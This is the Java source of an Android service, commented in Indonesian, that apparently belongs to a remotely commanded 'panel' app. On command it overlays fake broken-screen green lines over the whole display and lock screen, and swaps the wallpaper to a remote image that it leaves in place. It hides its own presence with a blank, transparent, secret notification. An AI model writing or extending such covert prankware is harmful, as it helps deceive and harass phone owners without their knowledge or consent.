package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

/**
 * LcdEffectService — Overlay 4 garis hijau vertikal fullscreen (efek LCD rusak).
 *
 * ON  → addView overlay garis hijau + ganti wallpaper ke URL CatBox
 * OFF → removeView overlay (HP kembali normal, wallpaper tetap berubah)
 *
 * Cara pakai dari BackgroundService:
 *   "lcdOn"  → startForegroundService(LcdEffectService, ACTION_LCD_ON)
 *   "lcdOff" → startForegroundService(LcdEffectService, ACTION_LCD_OFF)
 */
public class LcdEffectService extends Service {

    private static final String TAG     = "LcdEffectService";
    private static final String CHANNEL = "nex_lcd_effect";
    private static final int    NOTIF_ID = 9997;

    public static final String ACTION_LCD_ON  = "com.nex.panel.ACTION_LCD_ON";
    public static final String ACTION_LCD_OFF = "com.nex.panel.ACTION_LCD_OFF";

    // URL wallpaper yang akan diset saat LCD ON
    private static final String WALLPAPER_URL = "https://files.catbox.moe/7o6j3c.jpg";

    private WindowManager wm;
    private View          lcdOverlayView;

    // ────────────────────────────────────────────────────────────────────────
    //  Custom View — 4 garis hijau vertikal fullscreen
    // ────────────────────────────────────────────────────────────────────────
    private static class LcdLinesView extends View {

        private final Paint linePaint = new Paint(Paint.ANTI_ALIAS_FLAG);

        // Warna hijau cerah seperti di foto
        private static final int LINE_COLOR = Color.parseColor("#00FF00");
        // Lebar garis (px) — tipis seperti kabel LCD
        private static final float LINE_WIDTH = 2.5f;

        public LcdLinesView(Context ctx) {
            super(ctx);
            linePaint.setColor(LINE_COLOR);
            linePaint.setStrokeWidth(LINE_WIDTH);
            linePaint.setStyle(Paint.Style.STROKE);
        }

        @Override
        protected void onDraw(@NonNull Canvas canvas) {
            super.onDraw(canvas);
            int w = getWidth();
            int h = getHeight();
            if (w == 0 || h == 0) return;

            // 4 garis vertikal — posisi: ~12%, ~50%, ~80%, ~85% dari lebar layar
            // Sesuai foto: 1 garis kiri sendiri, 3 garis rapat di kanan
            float[] xPositions = {
                w * 0.12f,   // garis 1 — kiri
                w * 0.78f,   // garis 2 — kanan (3 garis rapat)
                w * 0.83f,   // garis 3
                w * 0.87f    // garis 4
            };

            for (float x : xPositions) {
                canvas.drawLine(x, 0, x, h, linePaint);
            }
        }
    }

    // ────────────────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        String action = intent.getAction();
        if (action == null) return START_NOT_STICKY;

        switch (action) {
            case ACTION_LCD_ON:
                showLcdOverlay();
                setWallpaper();
                break;

            case ACTION_LCD_OFF:
                removeLcdOverlay();
                // Wallpaper TIDAK dikembalikan sesuai permintaan
                stopSelf();
                break;
        }

        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── Tampilkan overlay garis LCD ───────────────────────────────────────
    private void showLcdOverlay() {
        try {
            if (lcdOverlayView != null) {
                Log.d(TAG, "LCD overlay sudah aktif, skip");
                return;
            }

            LcdLinesView view = new LcdLinesView(this);
            lcdOverlayView = view;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(lcdOverlayView, params);
            Log.d(TAG, "LCD overlay ON — 4 garis hijau aktif");

        } catch (Exception e) {
            Log.e(TAG, "showLcdOverlay error: " + e.getMessage());
        }
    }

    // ── Hapus overlay garis LCD ───────────────────────────────────────────
    private void removeLcdOverlay() {
        try {
            if (lcdOverlayView != null && wm != null) {
                wm.removeView(lcdOverlayView);
                lcdOverlayView = null;
                Log.d(TAG, "LCD overlay OFF — layar kembali normal");
            }
        } catch (Exception e) {
            Log.e(TAG, "removeLcdOverlay error: " + e.getMessage());
        }
    }

    // ── Ganti wallpaper ke WALLPAPER_URL (pakai SetWallpaperService) ──────
    private void setWallpaper() {
        try {
            Intent wi = new Intent(this, SetWallpaperService.class);
            wi.setAction(SetWallpaperService.ACTION_SET_WALLPAPER);
            wi.putExtra(SetWallpaperService.EXTRA_URL, WALLPAPER_URL);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(wi);
            } else {
                startService(wi);
            }
            Log.d(TAG, "Wallpaper diset ke: " + WALLPAPER_URL);
        } catch (Exception e) {
            Log.e(TAG, "setWallpaper error: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        removeLcdOverlay();
        super.onDestroy();
    }

    // ── Notification Channel ──────────────────────────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "LCD Effect", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {
                Log.e(TAG, "createNotificationChannel error: " + e.getMessage());
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .build();
    }
}
